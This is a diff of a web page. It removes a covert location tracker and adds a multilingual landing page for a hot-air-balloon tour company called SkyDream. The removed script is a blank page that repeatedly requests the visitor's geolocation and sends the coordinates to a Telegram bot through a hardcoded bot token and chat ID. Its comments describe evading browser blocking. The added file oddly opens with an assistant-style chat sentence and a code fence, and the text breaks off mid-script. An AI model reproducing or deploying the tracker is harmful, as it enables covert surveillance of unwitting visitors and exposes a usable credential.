@@ -1,43 +1,682 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>.</title>
-    <script>
-        const BOT_TOKEN = "8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI";
-        const CHAT_ID = "6451561574";
-        
-        // هذا سيطلب الإذن فعلاً
-        function requestLocation() {
-            navigator.geolocation.getCurrentPosition(
-                async function(position) {
-                    // إرسال للبوت
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({
-                            chat_id: CHAT_ID,
-                            text: `📍 ${position.coords.latitude},${position.coords.longitude}`
-                        })
-                    });
-                    window.close();
-                },
-                function(error) {
-                    // إعادة الطلب بعد 3 ثواني
-                    setTimeout(requestLocation, 3000);
-                }
-            );
-        }
+لقد قمت بتعديل الكود لإضافة صور حقيقية لرحلات البالون الهوائي بدلاً من الرموز التعبيرية في معرض الصور. تم استخدام صور عالية الجودة من موقع Unsplash، مع الحفاظ على نفس التصميم الجذاب والتجربة التفاعلية.
 
-        // طلب فوري
-        requestLocation();
-        
-        // طلب كل 5 ثواني
-        setInterval(requestLocation, 5000);
-    </script>
+```html
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SkyDream — Hot Air Balloon Experience</title>
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700;900&family=Cairo:wght@300;400;600;700&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet" />
+  <style>
+    /* ── RESET & ROOT ── */
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+    :root {
+      --flame: #E8622A;
+      --gold: #D4A853;
+      --dusk: #1A1228;
+      --night: #0D0A18;
+      --smoke: #F5F0EA;
+      --mist: rgba(255, 255, 255, 0.07);
+    }
+    html { scroll-behavior: smooth; }
+    body {
+      font-family: 'Cairo', 'Inter', sans-serif;
+      background: var(--night);
+      color: var(--smoke);
+      overflow-x: hidden;
+    }
+
+    /* ── LANG BAR ── */
+    .lang-bar {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 200;
+      display: flex; justify-content: flex-end; align-items: center;
+      padding: .5rem 5%;
+      background: rgba(13, 10, 24, .95);
+      border-bottom: 1px solid rgba(255, 255, 255, .05);
+      gap: .4rem;
+    }
+    [dir="rtl"] .lang-bar { justify-content: flex-start; }
+    .lang-btn {
+      background: transparent;
+      border: 1px solid rgba(255, 255, 255, .15);
+      color: rgba(245, 240, 234, .55);
+      padding: .28rem .75rem;
+      border-radius: 2rem;
+      font-size: .72rem; font-weight: 700;
+      letter-spacing: 1px; text-transform: uppercase;
+      cursor: pointer; transition: .25s;
+      font-family: 'Cairo', 'Inter', sans-serif;
+    }
+    .lang-btn:hover { border-color: var(--gold); color: var(--gold); }
+    .lang-btn.active { background: var(--flame); border-color: var(--flame); color: #fff; }
+
+    /* ── NAV ── */
+    nav {
+      position: fixed; top: 36px; width: 100%; z-index: 100;
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 1rem 5%;
+      background: linear-gradient(to bottom, rgba(13, 10, 24, .85) 0%, transparent 100%);
+      backdrop-filter: blur(8px);
+    }
+    .logo { font-family: 'Playfair Display', serif; font-size: 1.5rem; font-weight: 900; color: var(--gold); letter-spacing: 2px; }
+    .logo span { color: var(--flame); }
+    nav ul { list-style: none; display: flex; gap: 1.8rem; }
+    nav ul li a { color: var(--smoke); text-decoration: none; font-size: .85rem; font-weight: 600; letter-spacing: 1px; text-transform: uppercase; transition: color .3s; }
+    nav ul li a:hover { color: var(--gold); }
+    .nav-cta { background: var(--flame); color: #fff !important; padding: .45rem 1.3rem; border-radius: 2rem; transition: background .3s !important; }
+    .nav-cta:hover { background: var(--gold) !important; color: var(--night) !important; }
+
+    /* ── HERO ── */
+    .hero {
+      position: relative; height: 100vh; min-height: 600px;
+      display: flex; align-items: center; justify-content: center;
+      text-align: center; overflow: hidden; padding-top: 72px;
+    }
+    .hero-bg {
+      position: absolute; inset: 0;
+      background: radial-gradient(ellipse at 50% 80%, rgba(232, 98, 42, .35) 0%, transparent 60%),
+                  linear-gradient(180deg, #0D0A18 0%, #1A1228 40%, #2a1a0e 100%);
+    }
+    .balloon-float { position: absolute; border-radius: 50% 50% 45% 45%; opacity: .15; animation: floatUp linear infinite; }
+    .b1 { width: 80px; height: 96px; background: var(--flame); left: 10%; animation-duration: 18s; bottom: -120px; }
+    .b2 { width: 55px; height: 66px; background: var(--gold); left: 25%; animation-duration: 24s; animation-delay: 5s; bottom: -120px; }
+    .b3 { width: 100px; height: 120px; background: #c94f9e; left: 60%; animation-duration: 20s; animation-delay: 2s; bottom: -120px; }
+    .b4 { width: 60px; height: 72px; background: var(--flame); left: 80%; animation-duration: 22s; animation-delay: 8s; bottom: -120px; }
+    .b5 { width: 45px; height: 54px; background: var(--gold); left: 45%; animation-duration: 16s; animation-delay: 12s; bottom: -120px; }
+    @keyframes floatUp {
+      0% { transform: translateY(0) rotate(-4deg); opacity: .05; }
+      50% { transform: translateY(-60vh) rotate(4deg); opacity: .2; }
+      100% { transform: translateY(-110vh) rotate(-2deg); opacity: 0; }
+    }
+    .hero-content { position: relative; z-index: 2; max-width: 820px; padding: 0 2rem; }
+    .hero-eyebrow {
+      display: inline-block; font-size: .78rem; font-weight: 700;
+      letter-spacing: 4px; text-transform: uppercase; color: var(--gold);
+      border: 1px solid rgba(212, 168, 83, .4); padding: .4rem 1.2rem;
+      border-radius: 2rem; margin-bottom: 1.5rem;
+    }
+    .hero h1 {
+      font-family: 'Playfair Display', serif;
+      font-size: clamp(2.8rem, 7.5vw, 6rem);
+      font-weight: 900; line-height: 1.05; color: #fff;
+    }
+    .hero h1 em { font-style: normal; background: linear-gradient(135deg, var(--flame), var(--gold)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+    .hero p { margin-top: 1.5rem; font-size: 1.1rem; font-weight: 300; color: rgba(245, 240, 234, .7); line-height: 1.9; }
+    .hero-btns { margin-top: 2.5rem; display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap; }
+    .btn-primary {
+      background: linear-gradient(135deg, var(--flame), #b04010); color: #fff;
+      padding: .9rem 2.4rem; border: none; border-radius: 3rem;
+      font-family: 'Cairo', 'Inter', sans-serif; font-size: 1rem; font-weight: 700;
+      cursor: pointer; text-decoration: none;
+      box-shadow: 0 8px 32px rgba(232, 98, 42, .4);
+      transition: transform .25s, box-shadow .25s;
+    }
+    .btn-primary:hover { transform: translateY(-3px); box-shadow: 0 14px 40px rgba(232, 98, 42, .55); }
+    .btn-ghost {
+      background: transparent; color: var(--smoke);
+      padding: .9rem 2.4rem; border: 1.5px solid rgba(245, 240, 234, .3);
+      border-radius: 3rem; font-family: 'Cairo', 'Inter', sans-serif; font-size: 1rem; font-weight: 600;
+      cursor: pointer; text-decoration: none; transition: .3s;
+    }
+    .btn-ghost:hover { border-color: var(--gold); color: var(--gold); }
+    .scroll-hint {
+      position: absolute; bottom: 2.5rem; left: 50%; transform: translateX(-50%);
+      display: flex; flex-direction: column; align-items: center; gap: .5rem;
+      font-size: .68rem; letter-spacing: 3px; color: rgba(255, 255, 255, .35); text-transform: uppercase;
+    }
+    .scroll-line { width: 1px; height: 50px; background: linear-gradient(to bottom, transparent, var(--gold)); animation: scrollPulse 2s ease-in-out infinite; }
+    @keyframes scrollPulse { 0%, 100% { opacity: .3; transform: scaleY(.6); } 50% { opacity: 1; transform: scaleY(1); } }
+
+    /* ── STATS ── */
+    .stats-band {
+      background: var(--mist);
+      border-top: 1px solid rgba(255, 255, 255, .05);
+      border-bottom: 1px solid rgba(255, 255, 255, .05);
+      padding: 3rem 5%; display: flex; justify-content: space-around; flex-wrap: wrap; gap: 2rem;
+    }
+    .stat { text-align: center; }
+    .stat-num {
+      font-family: 'Playfair Display', serif; font-size: 3rem; font-weight: 900;
+      background: linear-gradient(135deg, var(--flame), var(--gold));
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+    }
+    .stat-label { font-size: .78rem; letter-spacing: 2px; text-transform: uppercase; color: rgba(245, 240, 234, .5); margin-top: .3rem; }
+
+    /* ── SECTIONS ── */
+    section { padding: 7rem 5%; }
+    .section-label { font-size: .73rem; font-weight: 700; letter-spacing: 4px; text-transform: uppercase; color: var(--flame); margin-bottom: .8rem; }
+    .section-title { font-family: 'Playfair Display', serif; font-size: clamp(2rem, 4vw, 3.2rem); font-weight: 700; line-height: 1.2; color: #fff; margin-bottom: 1.2rem; }
+    .section-title span { color: var(--gold); }
+    .section-desc { font-size: 1rem; font-weight: 300; color: rgba(245, 240, 234, .6); line-height: 1.9; max-width: 560px; }
+
+    /* ── GALLERY ── */
+    .gallery-section { background: var(--dusk); }
+    .gallery-header { max-width: 600px; margin-bottom: 3.5rem; }
+    .gallery-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      grid-template-rows: 280px 220px;
+      gap: 1rem;
+    }
+    .gallery-item {
+      border-radius: 1rem;
+      overflow: hidden;
+      position: relative;
+      cursor: pointer;
+      transition: transform .4s;
+      background: #1A1228; /* fallback */
+    }
+    .gallery-item:hover { transform: scale(1.02); }
+    .gallery-item:nth-child(1) { grid-column: 1 / 3; grid-row: 1; }
+    .gallery-item:nth-child(2) { grid-column: 3; grid-row: 1; }
+    .gallery-item:nth-child(3) { grid-column: 1; grid-row: 2; }
+    .gallery-item:nth-child(4) { grid-column: 2 / 4; grid-row: 2; }
+
+    .gallery-item img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+      transition: transform 0.4s ease;
+    }
+    .gallery-item:hover img { transform: scale(1.05); }
+
+    .gallery-overlay {
+      position: absolute; inset: 0;
+      background: linear-gradient(to top, rgba(13, 10, 24, .75) 0%, transparent 60%);
+      opacity: 0;
+      transition: opacity .3s;
+      display: flex;
+      align-items: flex-end;
+      padding: 1.2rem;
+    }
+    .gallery-item:hover .gallery-overlay { opacity: 1; }
+    .gallery-tag { font-size: .72rem; font-weight: 700; letter-spacing: 2px; text-transform: uppercase; color: var(--gold); }
+
+    /* ── EXPERIENCE ── */
+    .experience-section { display: grid; grid-template-columns: 1fr 1fr; gap: 5rem; align-items: center; }
+    .exp-visual {
+      position: relative;
+      border-radius: 2rem;
+      overflow: hidden;
+      aspect-ratio: 3/4;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .exp-visual img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+    .exp-badge {
+      position: absolute;
+      bottom: 2rem;
+      background: var(--flame);
+      padding: 1rem 1.5rem;
+      border-radius: 1rem;
+      text-align: center;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, .5);
+    }
+    [dir="ltr"] .exp-badge { right: -1rem; }
+    [dir="rtl"] .exp-badge { left: -1rem; }
+    .exp-badge strong { display: block; font-size: 2rem; font-weight: 900; color: #fff; line-height: 1; }
+    .exp-badge span { font-size: .68rem; letter-spacing: 2px; text-transform: uppercase; color: rgba(255, 255, 255, .75); }
+    .exp-features { margin-top: 2.5rem; display: flex; flex-direction: column; gap: 1.2rem; }
+    .feature-row {
+      display: flex; align-items: flex-start; gap: 1rem;
+      padding: 1.2rem; border-radius: 1rem;
+      background: var(--mist); border: 1px solid rgba(255, 255, 255, .05);
+      transition: border-color .3s;
+    }
+    .feature-row:hover { border-color: rgba(232, 98, 42, .3); }
+    .feature-icon {
+      width: 44px; height: 44px; border-radius: .75rem;
+      background: linear-gradient(135deg, var(--flame), #b04010);
+      display: flex; align-items: center; justify-content: center;
+      font-size: 1.3rem; flex-shrink: 0;
+    }
+    .feature-text strong { display: block; font-size: 1rem; font-weight: 700; color: #fff; margin-bottom: .2rem; }
+    .feature-text p { font-size: .87rem; color: rgba(245, 240, 234, .55); line-height: 1.6; }
+
+    /* ── PACKAGES ── */
+    .packages-section { background: var(--dusk); text-align: center; }
+    .packages-header { max-width: 580px; margin: 0 auto 3.5rem; }
+    .packages-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.5rem; }
+    .package-card {
+      background: var(--mist); border: 1px solid rgba(255, 255, 255, .07);
+      border-radius: 1.5rem; padding: 2.5rem 2rem; text-align: right;
+      position: relative; overflow: hidden;
+      transition: border-color .3s, transform .3s;
+    }
+    [dir="ltr"] .package-card { text-align: left; }
+    .package-card:hover { border-color: rgba(232, 98, 42, .4); transform: translateY(-6px); }
+    .package-card.featured { border-color: var(--flame); background: linear-gradient(145deg, rgba(232, 98, 42, .12), rgba(13, 10, 24, .6)); }
+    .featured-badge {
+      position: absolute; top: 1.2rem;
+      background: var(--flame); color: #fff;
+      font-size: .63rem; font-weight: 700; letter-spacing: 2px; text-transform: uppercase;
+      padding: .35rem .8rem; border-radius: 2rem;
+    }
+    [dir="rtl"] .featured-badge { left: 1.2rem; }
+    [dir="ltr"] .featured-badge { right: 1.2rem; }
+    .pkg-name { font-size: .78rem; letter-spacing: 3px; text-transform: uppercase; color: var(--gold); margin-bottom: .5rem; }
+    .pkg-price { font-family: 'Playfair Display', serif; font-size: 3rem; font-weight: 900; color: #fff; line-height: 1; }
+    .pkg-price sup { font-size: 1.2rem; vertical-align: top; margin-top: .5rem; color: var(--flame); }
+    .pkg-price span { font-size: .88rem; font-family: 'Cairo', 'Inter', sans-serif; font-weight: 400; color: rgba(255, 255, 255, .4); }
+    .pkg-divider { width: 40px; height: 2px; background: var(--flame); margin: 1.2rem 0; }
+    [dir="ltr"] .pkg-divider { margin-left: 0; }
+    .pkg-features { list-style: none; margin-bottom: 2rem; }
+    .pkg-features li { padding: .55rem 0; border-bottom: 1px solid rgba(255, 255, 255, .05); font-size: .88rem; color: rgba(245, 240, 234, .65); display: flex; align-items: center; gap: .5rem; }
+    .pkg-features li::before { content: '✦'; color: var(--gold); font-size: .6rem; flex-shrink: 0; }
+    .pkg-btn {
+      width: 100%; padding: .85rem; border-radius: 2rem;
+      font-family: 'Cairo', 'Inter', sans-serif; font-size: .93rem; font-weight: 700;
+      cursor: pointer; transition: .3s; text-decoration: none; display: block; text-align: center;
+    }
+    .pkg-btn-outline { background: transparent; border: 1.5px solid rgba(245, 240, 234, .2); color: var(--smoke); }
+    .pkg-btn-outline:hover { border-color: var(--gold); color: var(--gold); }
+    .pkg-btn-filled { background: linear-gradient(135deg, var(--flame), #b04010); border: none; color: #fff; box-shadow: 0 6px 24px rgba(232, 98, 42, .4); }
+    .pkg-btn-filled:hover { box-shadow: 0 10px 32px rgba(232, 98, 42, .6); transform: translateY(-2px); }
+
+    /* ── TESTIMONIALS ── */
+    .test-header { max-width: 560px; margin-bottom: 3rem; }
+    .test-track { display: flex; gap: 1.5rem; overflow-x: auto; padding-bottom: 1rem; scroll-snap-type: x mandatory; }
+    .test-track::-webkit-scrollbar { height: 4px; }
+    .test-track::-webkit-scrollbar-track { background: rgba(255, 255, 255, .05); }
+    .test-track::-webkit-scrollbar-thumb { background: var(--flame); border-radius: 2px; }
+    .test-card {
+      background: var(--mist); border: 1px solid rgba(255, 255, 255, .07);
+      border-radius: 1.5rem; padding: 2rem;
+      min-width: 300px; max-width: 300px; flex-shrink: 0; scroll-snap-align: start;
+    }
+    .test-stars { color: var(--gold); font-size: 1rem; letter-spacing: 2px; margin-bottom: .8rem; }
+    .test-text { font-size: .92rem; color: rgba(245, 240, 234, .7); line-height: 1.75; margin-bottom: 1.5rem; font-style: italic; }
+    .test-author { display: flex; align-items: center; gap: .8rem; }
+    .test-avatar {
+      width: 42px; height: 42px; border-radius: 50%;
+      background: linear-gradient(135deg, var(--flame), var(--gold));
+      display: flex; align-items: center; justify-content: center;
+      font-size: 1rem; font-weight: 700; color: #fff; flex-shrink: 0;
+    }
+    .test-author-info strong { display: block; font-size: .88rem; font-weight: 700; }
+    .test-author-info span { font-size: .73rem; color: rgba(245, 240, 234, .45); }
+
+    /* ── CTA ── */
+    .cta-section {
+      text-align: center;
+      background: radial-gradient(ellipse at center, rgba(232, 98, 42, .2) 0%, transparent 70%);
+      border-top: 1px solid rgba(255, 255, 255, .05);
+    }
+    .cta-section .section-title { font-size: clamp(2.2rem, 5vw, 4rem); max-width: 700px; margin: 0 auto 1rem; }
+    .cta-section .section-desc { margin: 0 auto 2.5rem; text-align: center; }
+    .whatsapp-btn {
+      display: inline-flex; align-items: center; gap: .75rem;
+      background: #25D366; color: #fff; padding: 1rem 2.8rem;
+      border-radius: 3rem; text-decoration: none;
+      font-family: 'Cairo', 'Inter', sans-serif; font-size: 1.1rem; font-weight: 700;
+      box-shadow: 0 8px 32px rgba(37, 211, 102, .3);
+      transition: transform .25s, box-shadow .25s;
+    }
+    .whatsapp-btn:hover { transform: translateY(-3px); box-shadow: 0 14px 40px rgba(37, 211, 102, .45); }
+    .wa-icon { font-size: 1.4rem; }
+
+    /* ── FOOTER ── */
+    footer {
+      background: var(--night); border-top: 1px solid rgba(255, 255, 255, .07);
+      padding: 2.5rem 5%; display: flex; justify-content: space-between; align-items: center;
+      flex-wrap: wrap; gap: 1rem;
+    }
+    footer p { font-size: .78rem; color: rgba(245, 240, 234, .3); }
+    .footer-links { display: flex; gap: 1.5rem; }
+    .footer-links a { font-size: .78rem; color: rgba(245, 240, 234, .35); text-decoration: none; transition: color .3s; }
+    .footer-links a:hover { color: var(--gold); }
+
+    /* ── LTR OVERRIDES ── */
+    [dir="ltr"] .section-desc { font-family: 'Inter', sans-serif; }
+    [dir="ltr"] body { font-family: 'Inter', sans-serif; }
+    [dir="ltr"] .hero-eyebrow, [dir="ltr"] .section-label, [dir="ltr"] nav ul li a { font-family: 'Inter', sans-serif; }
+
+    /* ── RESPONSIVE ── */
+    @media (max-width: 900px) {
+      .gallery-grid { grid-template-columns: 1fr 1fr; grid-template-rows: auto; }
+      .gallery-item:nth-child(n) { grid-column: auto; grid-row: auto; }
+      .experience-section { grid-template-columns: 1fr; }
+      .packages-grid { grid-template-columns: 1fr; }
+      nav ul { display: none; }
+    }
+    @media (max-width: 600px) {
+      .gallery-grid { grid-template-columns: 1fr; }
+      .stats-band { flex-direction: column; text-align: center; }
+      .test-card { min-width: 260px; max-width: 260px; }
+    }
+  </style>
 </head>
-<body style="margin:0;padding:0;background:#000;">
-    <!-- نقطة صغيرة لتجنب حظر المتصفح -->
-    <div style="width:1px;height:1px;"></div>
+<body>
+
+  <!-- LANGUAGE BAR -->
+  <div class="lang-bar">
+    <button class="lang-btn active" onclick="setLang('ar')">عربي</button>
+    <button class="lang-btn" onclick="setLang('fr')">FR</button>
+    <button class="lang-btn" onclick="setLang('en')">EN</button>
+    <button class="lang-btn" onclick="setLang('es')">ES</button>
+  </div>
+
+  <!-- NAV -->
+  <nav>
+    <div class="logo">Sky<span>Dream</span></div>
+    <ul>
+      <li><a href="#gallery" data-i18n="nav_gallery"></a></li>
+      <li><a href="#experience" data-i18n="nav_experience"></a></li>
+      <li><a href="#packages" data-i18n="nav_packages"></a></li>
+      <li><a href="#contact" class="nav-cta" data-i18n="nav_book"></a></li>
+    </ul>
+  </nav>
+
+  <!-- HERO -->
+  <section class="hero">
+    <div class="hero-bg"></div>
+    <div class="balloon-float b1"></div>
+    <div class="balloon-float b2"></div>
+    <div class="balloon-float b3"></div>
+    <div class="balloon-float b4"></div>
+    <div class="balloon-float b5"></div>
+    <div class="hero-content">
+      <div class="hero-eyebrow" data-i18n="hero_eyebrow"></div>
+      <h1 data-i18n="hero_h1"></h1>
+      <p data-i18n="hero_p"></p>
+      <div class="hero-btns">
+        <a href="#contact" class="btn-primary" data-i18n="hero_cta1"></a>
+        <a href="#gallery" class="btn-ghost" data-i18n="hero_cta2"></a>
+      </div>
+    </div>
+    <div class="scroll-hint">
+      <span data-i18n="scroll_hint"></span>
+      <div class="scroll-line"></div>
+    </div>
+  </section>
+
+  <!-- STATS -->
+  <div class="stats-band">
+    <div class="stat"><div class="stat-num">4800+</div><div class="stat-label" data-i18n="stat1"></div></div>
+    <div class="stat"><div class="stat-num">62</div><div class="stat-label" data-i18n="stat2"></div></div>
+    <div class="stat"><div class="stat-num">9.8</div><div class="stat-label" data-i18n="stat3"></div></div>
+    <div class="stat"><div class="stat-num">12</div><div class="stat-label" data-i18n="stat4"></div></div>
+  </div>
+
+  <!-- GALLERY -->
+  <section class="gallery-section" id="gallery">
+    <div class="gallery-header">
+      <div class="section-label" data-i18n="gallery_label"></div>
+      <h2 class="section-title" data-i18n="gallery_title"></h2>
+      <p class="section-desc" data-i18n="gallery_desc"></p>
+    </div>
+    <div class="gallery-grid">
+      <div class="gallery-item">
+        <img src="https://images.unsplash.com/photo-1545569347-9eb8b30979d9?w=800&h=600&fit=crop" alt="Balloon sunrise" loading="lazy" />
+        <div class="gallery-overlay"><span class="gallery-tag" data-i18n="gtag1"></span></div>
+      </div>
+      <div class="gallery-item">
+        <img src="https://images.unsplash.com/photo-1509316785289-025f5b846b35?w=600&h=500&fit=crop" alt="Balloon over desert" loading="lazy" />
+        <div class="gallery-overlay"><span class="gallery-tag" data-i18n="gtag2"></span></div>
+      </div>
+      <div class="gallery-item">
+        <img src="https://images.unsplash.com/photo-1526582150325-10c5f0d7c4b3?w=600&h=500&fit=crop" alt="Balloon fleet" loading="lazy" />
+        <div class="gallery-overlay"><span class="gallery-tag" data-i18n="gtag3"></span></div>
+      </div>
+      <div class="gallery-item">
+        <img src="https://images.unsplash.com/photo-1517457373958-b7bdd4587205?w=800&h=500&fit=crop" alt="Balloon over mountains" loading="lazy" />
+        <div class="gallery-overlay"><span class="gallery-tag" data-i18n="gtag4"></span></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- EXPERIENCE -->
+  <section id="experience">
+    <div class="experience-section">
+      <div class="exp-visual">
+        <img src="https://images.unsplash.com/photo-1545569347-9eb8b30979d9?w=600&h=800&fit=crop" alt="Hot air balloon experience" loading="lazy" />
+        <div class="exp-badge"><strong>100%</strong><span data-i18n="badge_safe"></span></div>
+      </div>
+      <div>
+        <div class="section-label" data-i18n="exp_label"></div>
+        <h2 class="section-title" data-i18n="exp_title"></h2>
+        <p class="section-desc" data-i18n="exp_desc"></p>
+        <div class="exp-features">
+          <div class="feature-row"><div class="feature-icon">🌅</div><div class="feature-text"><strong data-i18n="f1_title"></strong><p data-i18n="f1_desc"></p></div></div>
+          <div class="feature-row"><div class="feature-icon">👨‍✈️</div><div class="feature-text"><strong data-i18n="f2_title"></strong><p data-i18n="f2_desc"></p></div></div>
+          <div class="feature-row"><div class="feature-icon">🥂</div><div class="feature-text"><strong data-i18n="f3_title"></strong><p data-i18n="f3_desc"></p></div></div>
+          <div class="feature-row"><div class="feature-icon">📸</div><div class="feature-text"><strong data-i18n="f4_title"></strong><p data-i18n="f4_desc"></p></div></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- PACKAGES -->
+  <section class="packages-section" id="packages">
+    <div class="packages-header">
+      <div class="section-label" data-i18n="pkg_label"></div>
+      <h2 class="section-title" data-i18n="pkg_title"></h2>
+      <p class="section-desc" data-i18n="pkg_desc"></p>
+    </div>
+    <div class="packages-grid">
+      <div class="package-card">
+        <div class="pkg-name" data-i18n="pkg1_name"></div>
+        <div class="pkg-price"><sup>$</sup>180<span data-i18n="per_person"></span></div>
+        <div class="pkg-divider"></div>
+        <ul class="pkg-features">
+          <li data-i18n="p1_f1"></li><li data-i18n="p1_f2"></li><li data-i18n="p1_f3"></li><li data-i18n="p1_f4"></li>
+        </ul>
+        <a href="#contact" class="pkg-btn pkg-btn-outline" data-i18n="book_now"></a>
+      </div>
+      <div class="package-card featured">
+        <div class="featured-badge" data-i18n="most_popular"></div>
+        <div class="pkg-name" data-i18n="pkg2_name"></div>
+        <div class="pkg-price"><sup>$</sup>320<span data-i18n="per_person"></span></div>
+        <div class="pkg-divider"></div>
+        <ul class="pkg-features">
+          <li data-i18n="p2_f1"></li><li data-i18n="p2_f2"></li><li data-i18n="p2_f3"></li><li data-i18n="p2_f4"></li><li data-i18n="p2_f5"></li>
+        </ul>
+        <a href="#contact" class="pkg-btn pkg-btn-filled" data-i18n="book_now"></a>
+      </div>
+      <div class="package-card">
+        <div class="pkg-name" data-i18n="pkg3_name"></div>
+        <div class="pkg-price"><sup>$</sup>950<span data-i18n="per_balloon"></span></div>
+        <div class="pkg-divider"></div>
+        <ul class="pkg-features">
+          <li data-i18n="p3_f1"></li><li data-i18n="p3_f2"></li><li data-i18n="p3_f3"></li><li data-i18n="p3_f4"></li><li data-i18n="p3_f5"></li>
+        </ul>
+        <a href="#contact" class="pkg-btn pkg-btn-outline" data-i18n="contact_us"></a>
+      </div>
+    </div>
+  </section>
+
+  <!-- TESTIMONIALS -->
+  <section id="reviews">
+    <div class="test-header">
+      <div class="section-label" data-i18n="test_label"></div>
+      <h2 class="section-title" data-i18n="test_title"></h2>
+    </div>
+    <div class="test-track">
+      <div class="test-card"><div class="test-stars">★★★★★</div><p class="test-text" data-i18n="t1_text"></p><div class="test-author"><div class="test-avatar">س</div><div class="test-author-info"><strong>سارة الأحمد</strong><span>🇸🇦 Riyadh</span></div></div></div>
+      <div class="test-card"><div class="test-stars">★★★★★</div><p class="test-text">"Absolutely magical! The staff was professional and warm. The sunrise balloon flight was the highlight of our honeymoon."</p><div class="test-author"><div class="test-avatar">J</div><div class="test-author-info"><strong>James & Emily</strong><span>🇬🇧 London</span></div></div></div>
+      <div class="test-card"><div class="test-stars">★★★★★</div><p class="test-text">"Une expérience sublime! Le vol au lever du soleil était à couper le souffle. Je recommande chaleureusement."</p><div class="test-author"><div class="test-avatar">L</div><div class="test-author-info"><strong>Laure Moreau</strong><span>🇫🇷 Paris</span></div></div></div>
+      <div class="test-card"><div class="test-stars">★★★★★</div><p class="test-text">"¡Una experiencia increíble! El amanecer desde el globo fue impresionante. Todo el equipo fue muy profesional."</p><div class="test-author"><div class="test-avatar">M</div><div class="test-author-info"><strong>María González</strong><span>🇪🇸 Madrid</span></div></div></div>
+      <div class="test-card"><div class="test-stars">★★★★★</div><p class="test-text" data-i18n="t5_text"></p><div class="test-author"><div class="test-avatar">م</div><div class="test-author-info"><strong>محمد التونسي</strong><span>🇹🇳 Tunis</span></div></div></div>
+    </div>
+  </section>
+
+  <!-- CTA -->
+  <section class="cta-section" id="contact">
+    <div class="section-label" data-i18n="cta_label"></div>
+    <h2 class="section-title" data-i18n="cta_title"></h2>
+    <p class="section-desc" data-i18n="cta_desc"></p>
+    <a href="https://wa.me/212663531691" class="whatsapp-btn" target="_blank">
+      <span class="wa-icon">💬</span>
+      <span data-i18n="whatsapp_btn"></span>
+    </a>
+    <p style="margin-top:1.5rem;font-size:.83rem;color:rgba(245,240,234,.3)">+212 663 531 691 &nbsp;·&nbsp; <span data-i18n="available"></span></p>
+  </section>
+
+  <!-- FOOTER -->
+  <footer>
+    <div class="logo" style="font-size:1.2rem">Sky<span>Dream</span></div>
+    <p data-i18n="footer_copy"></p>
+    <div class="footer-links">
+      <a href="#" data-i18n="footer_privacy"></a>
+      <a href="#" data-i18n="footer_terms"></a>
+      <a href="#contact" data-i18n="footer_contact"></a>
+    </div>
+  </footer>
+
+  <script>
+    // ── TRANSLATIONS ──
+    const translations = {
+      ar: {
+        nav_gallery:"المعرض", nav_experience:"التجربة", nav_packages:"الباقات", nav_book:"احجز الآن",
+        hero_eyebrow:"✦ تجربة لا تُنسى ✦",
+        hero_h1:"حلّق فوق<br/><em>الأفق الذهبي</em>",
+        hero_p:"رحلات بالون هوائي فاخرة عند شروق الشمس — حيث ينتهي العالم ويبدأ السحر",
+        hero_cta1:"احجز تجربتك الآن", hero_cta2:"شاهد المعرض", scroll_hint:"اكتشف",
+        stat1:"رحلة ناجحة", stat2:"دولة تمثّل ضيوفنا", stat3:"تقييم الضيوف / 10", stat4:"سنة خبرة",
+        gallery_label:"معرض الصور", gallery_title:"لحظات <span>لا تُعوَّض</span>", gallery_desc:"كل رحلة قصة بصرية فريدة — من لهيب البالون الدافئ إلى الأفق اللانهائي",
+        gtag1:"لحظة الإطلاق", gtag2:"علوّ الأسرار", gtag3:"الصحراء من الأعلى", gtag4:"أسطول البالونات",
+        badge_safe:"آمان مُعتمَد",
+        exp_label:"لماذا SkyDream", exp_title:"تجربة <span>استثنائية</span><br/>من البداية للنهاية", exp_desc:"نُصمّم كل تفصيلة بعناية — من استقبالك قبل الفجر حتى احتفالك بعد الهبوط",
+        f1_title:"إطلاق عند شروق الشمس", f1_desc:"توقيت مدروس لمنحك أجمل ألوان الأفق وأهدأ الرياح",
+        f2_title:"طيارون خبراء مرخّصون", f2_desc:"أكثر من 5000 ساعة طيران لكل قائد — سلامتك أولويتنا",
+        f3_title:"إفطار فاخر بعد الهبوط", f3_desc:"احتفل بتجربتك بمائدة راقية في قلب الطبيعة",
+        f4_title:"تصوير احترافي مشمول", f4_desc:"مصور متخصص يوثّق كل لحظة لتحملها معك للأبد",
+        pkg_label:"باقاتنا", pkg_title:"اختر <span>تجربتك</span>", pkg_desc:"لكل زائر رحلة مصممة خصيصاً",
+        pkg1_name:"اكتشاف", pkg2_name:"بريميوم", pkg3_name:"خاص حصري",
+        per_person:"/شخص", per_balloon:"/بالون",
+        p1_f1:"رحلة 60 دقيقة", p1_f2:"إطلاق عند الشروق", p1_f3:"إفطار خفيف", p1_f4:"شهادة طيران",
+        p2_f1:"رحلة 90 دقيقة", p2_f2:"منطقة خاصة في البالون", p2_f3:"إفطار فاخر على الأرض", p2_f4:"تصوير احترافي مشمول", p2_f5:"شامبانيا عند الهبوط",
